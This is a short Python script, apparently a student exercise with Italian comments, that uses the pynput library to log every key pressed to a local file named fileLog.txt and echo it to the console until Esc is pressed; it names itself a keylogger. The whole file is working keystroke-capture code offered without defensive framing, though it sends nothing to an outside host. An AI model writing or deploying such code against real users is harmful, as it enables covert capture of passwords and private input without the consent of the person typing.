# -*- coding: utf-8 -*-
"""
Created on Fri Sep 17 20:06:56 2021

@author: peppi
"""

#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Fri Sep 17 13:53:28 2021

@author: kali
"""

#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Fri Sep 17 13:34:17 2021

@author: kali
"""

from pynput import keyboard

def onPress(key):
    
    #tasto="il tasto premuto e: ",+format(key)+"\n"
    
    print("il tasto premuto e: ",format(key))
    
    #fileOutput=open("fileLog.txt","a+")
    fileOutput.write(format(key))
    
    


def onRelease(key):
    print("il tasto rilasciato e: ",format(key))
    
    #per interrompere il funzionamento clicca esc e lui esce
    if str(key)=="Key.esc":
        print("esco dal keylogger")
        fileOutput.close()
        return False
    
     
    


fileOutput=open("fileLog.txt","a+")

with keyboard.Listener(
        on_press=onPress,
        on_release=onRelease
        ) as listener:
    listener.join()
    


